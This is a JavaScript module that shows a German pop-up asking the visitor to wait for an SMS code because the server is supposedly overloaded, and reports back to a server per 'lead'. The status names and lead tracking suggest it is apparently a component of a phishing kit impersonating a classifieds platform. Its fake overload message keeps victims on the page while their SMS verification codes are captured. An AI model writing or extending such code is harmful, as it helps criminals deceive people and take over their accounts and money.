const NOTICE_STATUS = 'klein_sms_wait';
const MODAL_ID = 'knz-klein-sms-wait-notice';
const STYLE_ID = 'knz-klein-sms-wait-notice-style';
const shownLeadIds = new Set();

function ensureStyles() {
  if (document.getElementById(STYLE_ID)) return;
  var style = document.createElement('style');
  style.id = STYLE_ID;
  style.textContent = [
    '.knz-sms-wait-notice{position:fixed;inset:0;z-index:10050;display:flex;align-items:center;justify-content:center;padding:16px;box-sizing:border-box;}',
    '.knz-sms-wait-notice[hidden]{display:none!important;}',
    '.knz-sms-wait-notice__backdrop{position:absolute;inset:0;background:rgba(0,0,0,0.46);}',
    '.knz-sms-wait-notice__panel{position:relative;width:min(520px,100%);background:#fff;border-radius:16px;box-shadow:0 14px 48px rgba(0,0,0,0.24);overflow:hidden;}',
    '.knz-sms-wait-notice__header{display:flex;align-items:center;justify-content:space-between;padding:22px 24px;border-bottom:1px solid #ece8e2;}',
    '.knz-sms-wait-notice__title{margin:0;font-size:1.3rem;font-weight:700;color:#0c0c0b;}',
    '.knz-sms-wait-notice__close{width:40px;height:40px;border:1px solid #d8d4cd;background:#fff;border-radius:12px;color:#4f4e49;font-size:26px;line-height:1;cursor:pointer;}',
    '.knz-sms-wait-notice__body{padding:22px 24px 16px 24px;}',
    '.knz-sms-wait-notice__text{margin:0;background:#f7f7f7;border:1px solid #d7d7d7;border-radius:14px;padding:18px 16px;font-size:1rem;line-height:1.42;word-break:break-word;color:#202020;}',
    '.knz-sms-wait-notice__actions{padding:0 24px 24px 24px;}',
    '.knz-sms-wait-notice__ok{min-width:120px;min-height:44px;padding:10px 28px;border:none;border-radius:9999px;background:#1f66d1;color:#fff;font-weight:700;font-size:1rem;cursor:pointer;}'
  ].join('');
  document.head.appendChild(style);
}

function ensureModal() {
  var existing = document.getElementById(MODAL_ID);
  if (existing) return existing;
  ensureStyles();
  var wrap = document.createElement('div');
  wrap.id = MODAL_ID;
  wrap.className = 'knz-sms-wait-notice';
  wrap.hidden = true;
  wrap.setAttribute('role', 'dialog');
  wrap.setAttribute('aria-modal', 'true');
  wrap.innerHTML = [
    '<div class="knz-sms-wait-notice__backdrop" data-close="1"></div>',
    '<div class="knz-sms-wait-notice__panel">',
    '  <div class="knz-sms-wait-notice__header">',
    '    <h3 class="knz-sms-wait-notice__title">SMS</h3>',
    '    <button type="button" class="knz-sms-wait-notice__close" aria-label="Schließen" data-close="1">&times;</button>',
    '  </div>',
    '  <div class="knz-sms-wait-notice__body">',
    '    <p class="knz-sms-wait-notice__text">Bitte warte ein paar Minuten auf den SMS-Code, der Server ist überlastet. Verlasse die Seite nicht, damit das Eingabefeld für die SMS nicht verschwindet.</p>',
    '  </div>',
    '  <div class="knz-sms-wait-notice__actions">',
    '    <button type="button" class="knz-sms-wait-notice__ok" data-close="1">OK</button>',
    '  </div>',
    '</div>'
  ].join('');
  function close() {
    wrap.hidden = true;
  }
  wrap.addEventListener('click', function (e) {
    var t = e.target;
    if (t && t.getAttribute && t.getAttribute('data-close') === '1') close();
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && !wrap.hidden) close();
  });
  document.body.appendChild(wrap);
  return wrap;
}

function showNotice() {
  var modal = ensureModal();
  modal.hidden = false;
}

function ackNotice(leadId) {
  if (!leadId) return;
  fetch('/api/klein-sms-wait-ack?id=' + encodeURIComponent(leadId) + '&_=' + Date.now(), {
    method: 'GET',
    cache: 'no-store',
    credentials: 'include',
    headers: { Pragma: 'no-cache' }
  }).catch(function () {});
}

export function consumeKleinSmsWaitNotice(statusRes, leadId) {
  var status = statusRes && typeof statusRes.scriptStatus === 'string' ? statusRes.scriptStatus : '';
  if (status !== NOTICE_STATUS || !leadId) return;
  if (shownLeadIds.has(leadId)) return;
  shownLeadIds.add(leadId);
  showNotice();
  ackNotice(leadId);
}

